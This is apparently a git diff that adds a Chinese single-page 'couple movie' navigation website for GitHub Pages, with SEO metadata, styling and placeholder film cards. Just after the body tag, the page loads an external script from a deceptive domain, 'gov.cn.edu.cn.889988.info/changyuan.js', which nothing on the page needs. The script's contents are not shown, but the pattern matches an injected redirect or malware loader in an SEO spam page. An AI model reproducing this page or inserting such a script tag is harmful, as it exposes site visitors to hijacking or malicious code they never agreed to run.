@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>我俩看电影网 - 情侣双人观影在线观看 | woliakandianyingwang-top.github.io</title>
+<meta name="description" content="我俩看电影网（https://woliakandianyingwang-top.github.io）提供适合情侣双人观看的爱情、浪漫、治愈、青春电影在线观看与分类导航，移动端自适应，单页直达，符合必应收录。">
+<meta name="keywords" content="我俩看电影网,情侣电影,双人观影,爱情电影,浪漫电影,约会电影,woliakandianyingwang-top.github.io">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://woliakandianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://woliakandianyingwang-top.github.io">
+<meta property="og:title" content="我俩看电影网 - 情侣双人观影在线观看">
+<meta property="og:description" content="我俩看电影网提供适合情侣双人观看的爱情、浪漫、治愈、青春电影在线观看与分类导航，移动端自适应，单页直达。">
+<meta property="og:image" content="https://picsum.photos/1200/630?random=525">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="https://woliakandianyingwang-top.github.io">
+<meta property="twitter:title" content="我俩看电影网 - 情侣双人观影在线观看">
+<meta property="twitter:description" content="我俩看电影网提供适合情侣双人观看的爱情、浪漫、治愈、青春电影在线观看与分类导航，移动端自适应，单页直达。">
+<meta property="twitter:image" content="https://picsum.photos/1200/630?random=525">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "我俩看电影网",
+  "url": "https://woliakandianyingwang-top.github.io",
+  "description": "我俩看电影网提供适合情侣双人观看的爱情、浪漫、治愈、青春电影在线观看与分类导航。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://woliakandianyingwang-top.github.io#search",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#fff5f8;
+  --white:#ffffff;
+  --pink:#ff6b9d;
+  --pink-light:#ffd6e5;
+  --purple:#a855f7;
+  --purple-light:#e9d5ff;
+  --grad:linear-gradient(135deg,#ff6b9d,#a855f7);
+  --grad2:linear-gradient(135deg,#ffd6e5,#e9d5ff);
+  --text:#2d1b2e;
+  --muted:#8b6f8b;
+  --muted2:#b08fb0;
+  --radius:24px;
+  --radius-sm:16px;
+  --shadow:0 12px 36px rgba(255,107,157,0.18);
+  --shadow-soft:0 6px 20px rgba(255,107,157,0.12);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;transition:.25s ease}
+img{max-width:100%;display:block}
+.container{width:100%;max-width:1200px;margin:0 auto;padding:0 22px}
+
+/* 背景装饰气泡 */
+.bubbles{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.bubbles span{position:absolute;border-radius:50%;opacity:.5}
+.bubbles .b1{width:320px;height:320px;left:-120px;top:-80px;background:radial-gradient(circle,var(--pink-light),transparent 70%)}
+.bubbles .b2{width:280px;height:280px;right:-100px;top:200px;background:radial-gradient(circle,var(--purple-light),transparent 70%)}
+.bubbles .b3{width:240px;height:240px;left:20%;bottom:-80px;background:radial-gradient(circle,#ffeef4,transparent 70%)}
+
+header{position:sticky;top:0;z-index:1000;background:rgba(255,255,255,0.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--pink-light)}
+.nav{display:flex;align-items:center;justify-content:space-between;padding:16px 0}
+.logo{display:flex;align-items:center;gap:12px;font-size:20px;font-weight:800}
+.logo .hearts{display:flex;align-items:center}
+.logo .hearts .h1{width:32px;height:32px;border-radius:50%;background:var(--pink);display:grid;place-items:center;font-size:15px;color:#fff;z-index:2}
+.logo .hearts .h2{width:32px;height:32px;border-radius:50%;background:var(--purple);display:grid;place-items:center;font-size:15px;color:#fff;margin-left:-10px;z-index:1}
+.logo b{color:var(--pink)}
+.menu{display:flex;gap:28px;list-style:none}
+.menu a{font-size:15px;font-weight:600;color:var(--muted)}
+.menu a:hover{color:var(--pink)}
+.toggle{display:none;width:42px;height:42px;border-radius:14px;background:var(--white);border:1px solid var(--pink-light);color:var(--pink);font-size:20px;text-align:center;line-height:42px;cursor:pointer}
+
+.wrap{position:relative;z-index:1}
+.hero{padding:96px 0 76px}
+.hero-card{max-width:800px;margin:0 auto;text-align:center;background:var(--white);border-radius:32px;padding:52px 38px;box-shadow:var(--shadow);position:relative}
+.hero-card::before{content:'';position:absolute;top:-16px;left:40px;width:0;height:0;border-left:14px solid transparent;border-right:14px solid transparent;border-bottom:18px solid var(--white);transform:rotate(-20deg)}
+.badge{display:inline-block;font-size:12px;font-weight:800;letter-spacing:2px;color:#fff;background:var(--grad);padding:7px 18px;border-radius:30px;margin-bottom:22px}
+.hero h1{font-size:48px;line-height:1.2;font-weight:800;margin-bottom:18px}
+.hero h1 span{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{font-size:16px;color:var(--muted);margin-bottom:12px}
+.hero p strong{color:var(--text)}
+.urlbox{display:inline-block;margin:10px 0 26px;font-family:"Courier New",monospace;font-size:15px;font-weight:700;color:var(--purple);background:var(--bg);border:2px dashed var(--pink-light);padding:11px 18px;border-radius:14px;word-break:break-all}
+.btn{display:inline-block;font-weight:800;font-size:16px;color:#fff;background:var(--grad);padding:15px 40px;border-radius:30px;box-shadow:var(--shadow)}
+.btn:hover{transform:translateY(-3px);box-shadow:0 16px 40px rgba(255,107,157,0.35)}
+
+section.block{padding:78px 0}
+.head{text-align:center;margin-bottom:46px}
+.head .en{display:block;font-size:12px;letter-spacing:4px;font-weight:800;color:var(--purple);margin-bottom:10px}
+.head h2{font-size:34px;font-weight:800;margin-bottom:8px}
+.head h2 em{font-style:normal;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.head p{color:var(--muted2);font-size:15px}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.card{background:var(--white);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow-soft);transition:.3s}
+.card:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
+.thumb{position:relative}
+.thumb img{width:100%;aspect-ratio:3/4;object-fit:cover;filter:saturate(1.05)}
+.tag{position:absolute;top:12px;left:12px;font-size:11px;font-weight:800;color:#fff;background:var(--grad);padding:5px 12px;border-radius:20px}
+.duo{position:absolute;top:12px;right:12px;font-size:11px;font-weight:800;color:var(--text);background:rgba(255,255,255,0.92);padding:5px 10px;border-radius:20px}
+.info{padding:18px 18px 20px}
+.info h3{font-size:17px;font-weight:800;margin-bottom:6px}
+.info p{font-size:13px;color:var(--muted);margin-bottom:14px}
+.play{display:inline-block;font-size:13px;font-weight:800;color:var(--pink);border:2px solid var(--pink-light);padding:8px 20px;border-radius:20px;background:var(--bg)}
+.play:hover{background:var(--grad);color:#fff;border-color:transparent}
+
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.cat{background:var(--white);border-radius:var(--radius-sm);padding:26px 18px;text-align:center;box-shadow:var(--shadow-soft);transition:.3s}
+.cat:hover{transform:translateY(-5px);box-shadow:var(--shadow)}
+.cat .ico{font-size:30px;margin-bottom:10px}
+.cat h3{font-size:16px;font-weight:800;margin-bottom:4px}
+.cat p{font-size:12px;color:var(--muted2)}
+
+.feats{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.feat{display:flex;gap:18px;align-items:flex-start;background:var(--white);border-radius:var(--radius-sm);padding:26px;box-shadow:var(--shadow-soft)}
+.feat:hover{box-shadow:var(--shadow)}
+.feat .ic{width:50px;height:50px;flex:0 0 50px;border-radius:14px;display:grid;place-items:center;font-size:24px;background:var(--grad2)}
+.feat h3{font-size:17px;font-weight:800;margin-bottom:6px}
+.feat p{font-size:14px;color:var(--muted)}
+
+.about{background:var(--white);border-radius:32px;padding:54px 40px;text-align:center;box-shadow:var(--shadow)}
+.about p{font-size:16px;color:var(--muted);max-width:760px;margin:0 auto 14px}
+.about p strong{color:var(--text)}
+
+footer{position:relative;z-index:1;background:var(--text);padding:56px 0 28px;margin-top:30px;border-radius:32px 32px 0 0}
+.fgrid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:34px}
+.fbrand h3{font-size:20px;font-weight:800;color:var(--pink);margin-bottom:10px}
+.fbrand p{font-size:13px;color:var(--muted2)}
+.fcol h4{font-size:14px;font-weight:800;margin-bottom:14px;color:#fff}
+.fcol ul{list-style:none}
+.fcol li{margin-bottom:9px}
+.fcol a{font-size:13px;color:var(--muted2)}
+.fcol a:hover{color:var(--pink)}
+.copy{border-top:1px solid rgba(255,255,255,0.15);padding-top:20px;text-align:center;font-size:12px;color:var(--muted2)}
+.copy a{color:var(--pink)}
+
+@media(max-width:992px){
+  .hero h1{font-size:40px}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .toggle{display:block}
+  .menu{position:fixed;top:72px;left:-100%;width:100%;height:calc(100vh - 72px);background:var(--white);flex-direction:column;align-items:center;gap:26px;padding-top:40px;transition:.3s;border-top:1px solid var(--pink-light)}
+  .menu.active{left:0}
+  .menu a{font-size:18px}
+  .hero{padding:76px 0 56px}
+  .hero h1{font-size:32px}
+  .hero-card{padding:38px 20px}
+  .block{padding:60px 0}
+  .head h2{font-size:26px}
+  .grid{grid-template-columns:1fr}
+  .feats{grid-template-columns:1fr}
+  .fgrid{grid-template-columns:1fr}
+}
+@media(max-width:480px){
+  .hero h1{font-size:27px}
+  .btn{padding:13px 30px;font-size:15px}
+  .head h2{font-size:22px}
+  .cats{grid-template-columns:1fr}
+  .urlbox{font-size:13px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="bubbles" aria-hidden="true">
+  <span class="b1"></span><span class="b2"></span><span class="b3"></span>
+</div>
+
+<div class="wrap">
+<header>
+  <div class="container nav">
+    <a href="#" class="logo">
+      <div class="hearts"><span class="h1">♥</span><span class="h2">♡</span></div>
+      我俩<b>看电影</b>网
+    </a>
+    <div class="toggle" onclick="document.querySelector('.menu').classList.toggle('active')">☰</div>
+    <ul class="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#hot">双人片单</a></li>
+      <li><a href="#cats">约会场景</a></li>
+      <li><a href="#feature">陪伴特色</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+  <section class="hero" id="home">
+    <div class="container">
+      <div class="hero-card">
+        <span class="badge">Couple Movie Time ♥</span>
+        <h1>我俩看电影网<br><span>两个人，一部好片</span></h1>
+        <p>网站名称：<strong>我俩看电影网</strong> ｜ 网址：<strong>https://woliakandianyingwang-top.github.io</strong></p>
+        <div class="urlbox">https://woliakandianyingwang-top.github.io</div>
+        <p>适合情侣双人观看的爱情、浪漫、治愈、青春电影分类导航，移动端自适应、单页直达、必应收录友好。</p>
+        <br>
+        <a href="#hot" class="btn">一起选片 ♥</a>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="hot">
+    <div class="container">
+      <div class="head">
+        <span class="en">DOUBLE FEATURE</span>
+        <h2>双人<em>片单</em></h2>
+        <p>精选适合两个人一起看的电影</p>
+      </div>
+      <div class="grid">
+        <article class="card">
+          <div class="thumb">
+            <img src="https://picsum.photos/400/600?random=5251" width="400" height="600" loading="lazy" alt="我俩看电影网推荐浪漫爱情片">
+            <span class="tag">浪漫</span><span class="duo">♥ 双人</span>
+          </div>
+          <div class="info">
+            <h3>怦然心动</h3>
+            <p>2010 · 爱情/青春 · 高清</p>
+            <a href="#" class="play">一起看</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb">
+            <img src="https://picsum.photos/400/600?random=5252" width="400" height="600" loading="lazy" alt="我俩看电影网推荐治愈片">
+            <span class="tag">治愈</span><span class="duo">♥ 双人</span>
+          </div>
+          <div class="info">
+            <h3>小森林的约定</h3>
+            <p>2015 · 治愈/美食 · 高清</p>
+            <a href="#" class="play">一起看</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb">
+            <img src="https://picsum.photos/400/600?random=5253" width="400" height="600" loading="lazy" alt="我俩看电影网推荐爱情喜剧片">
+            <span class="tag">喜剧</span><span class="duo">♥ 双人</span>
+          </div>
+          <div class="info">
+            <h3>假结婚真心动</h3>
+            <p>2009 · 爱情/喜剧 · 高清</p>
+            <a href="#" class="play">一起看</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb">
+            <img src="https://picsum.photos/400/600?random=5254" width="400" height="600" loading="lazy" alt="我俩看电影网推荐感人爱情片">
+            <span class="tag">感人</span><span class="duo">♥ 双人</span>
+          </div>
+          <div class="info">
+            <h3>爱在黎明前</h3>
+            <p>1995 · 爱情/文艺 · 高清</p>
+            <a href="#" class="play">一起看</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb">
+            <img src="https://picsum.photos/400/600?random=5255" width="400" height="600" loading="lazy" alt="我俩看电影网推荐青春校园片">
+            <span class="tag">青春</span><span class="duo">♥ 双人</span>
+          </div>
+          <div class="info">
+            <h3>你的名字。</h3>
+            <p>2016 · 青春/奇幻 · 高清</p>
+            <a href="#" class="play">一起看</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb">
+            <img src="https://picsum.photos/400/600?random=5256" width="400" height="600" loading="lazy" alt="我俩看电影网推荐经典爱情片">
+            <span class="tag">经典</span><span class="duo">♥ 双人</span>
+          </div>
+          <div class="info">
+            <h3>泰坦尼克号</h3>
+            <p>1997 · 爱情/史诗 · 高清</p>
+            <a href="#" class="play">一起看</a>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="cats">
+    <div class="container">
+      <div class="head">
+        <span class="en">DATE SCENES</span>
+        <h2>按<em>约会场景</em>分类</h2>
+        <p>根据你们的约会氛围挑选合适影片</p>
+      </div>
+      <div class="cats">
+        <a href="#" class="cat"><div class="ico">🌹</div><h3>浪漫约会</h3><p>甜蜜升温</p></a>
+        <a href="#" class="cat"><div class="ico">😂</div><h3>欢乐约会</h3><p>笑声不断</p></a>
+        <a href="#" class="cat"><div class="ico">😢</div><h3>催泪约会</h3><p>抱紧彼此</p></a>
+        <a href="#" class="cat"><div class="ico">🍿</div><h3>宅家约会</h3><p>沙发电影夜</p></a>
+        <a href="#" class="cat"><div class="ico">🌙</div><h3>深夜约会</h3><p>枕边观影</p></a>
+        <a href="#" class="cat"><div class="ico">✈️</div><h3>旅行约会</h3><p>路上陪伴</p></a>
+        <a href="#" class="cat"><div class="ico">🎡</div><h3>纪念日</h3><p>特殊日子</p></a>
+        <a href="#" class="cat"><div class="ico">🏠</div><h3>周末日常</h3><p>轻松惬意</p></a>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="feature">
+    <div class="container">
+      <div class="head">
+        <span class="en">WHY TOGETHER</span>
+        <h2>陪伴<em>特色</em></h2>
+        <p>为两个人精心挑选的观影体验</p>
+      </div>
+      <div class="feats">
+        <div class="feat"><div class="ic">♥</div><div><h3>双人视角选片</h3><p>从情侣共同兴趣出发，兼顾双方口味，避免"你想看的不想看"的尴尬。</p></div></div>
+        <div class="feat"><div class="ic">🍿</div><div><h3>约会场景分类</h3><p>按浪漫、欢乐、催泪、宅家等约会氛围分类，精准匹配你们的相处时刻。</p></div></div>
+        <div class="feat"><div class="ic">📱</div><div><h3>移动端自适应</h3><p>992/768/480三档断点，汉堡菜单，手机平板桌面统一URL，随时随地一起看。</p></div></div>
+        <div class="feat"><div class="ic">🔎</div><div><h3>必应收录友好</h3><p>自引用canonical、TDK、OG/Twitter、WebSite JSON-LD齐全，语义化H1-H3。</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="container">
+      <div class="about">
+        <div class="head"><span class="en">ABOUT US</span><h2>关于<em>我俩看电影网</em></h2></div>
+        <p>我俩看电影网（<strong>woliakandianyingwang-top.github.io</strong>）是专注情侣双人观影的单页导航演示站，整理浪漫、治愈、青春、喜剧类适合两个人一起看的电影与分类入口。</p>
+        <div class="urlbox">https://woliakandianyingwang-top.github.io</div>
+        <p>本页所有CSS/JS内联、内页链接以#占位；部署到GitHub Pages后，可在必应站长工具提交首页URL加快收录。按需求不生成robots.txt与sitemap.xml。</p>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="fgrid">
+      <div class="fbrand">
+        <h3>♥ 我俩看电影网</h3>
+        <p>适合情侣双人观看的电影分类导航，粉紫渐变气泡风单页，移动端自适应，轻量直达。</p>
+      </div>
+      <div class="fcol">
+        <h4>快捷导航</h4>
+        <ul><li><a href="#home">首页</a></li><li><a href="#hot">双人片单</a></li><li><a href="#cats">约会场景</a></li></ul>
+      </div>
+      <div class="fcol">
+        <h4>约会类型</h4>
+        <ul><li><a href="#">浪漫约会</a></li><li><a href="#">欢乐约会</a></li><li><a href="#">催泪约会</a></li></ul>
+      </div>
+      <div class="fcol">
+        <h4>关于</h4>
+        <ul><li><a href="#about">关于本站</a></li><li><a href="#">免责声明</a></li><li><a href="https://woliakandianyingwang-top.github.io">访问官网</a></li></ul>
+      </div>
+    </div>
+    <div class="copy">
+      <p>© 2024 我俩看电影网 演示页. All rights reserved.</p>
+      <p>网站名称：<strong>我俩看电影网</strong> ｜ 网址：<a href="https://woliakandianyingwang-top.github.io">https://woliakandianyingwang-top.github.io</a></p>
+    </div>
+  </div>
+</footer>
+</div>
+
+<script>
+document.querySelector('.toggle').addEventListener('click',function(){document.querySelector('.menu').classList.toggle('active');});
+document.querySelectorAll('.menu a').forEach(function(l){l.addEventListener('click',function(){document.querySelector('.menu').classList.remove('active');});});
+</script>
+</body>
+</html>
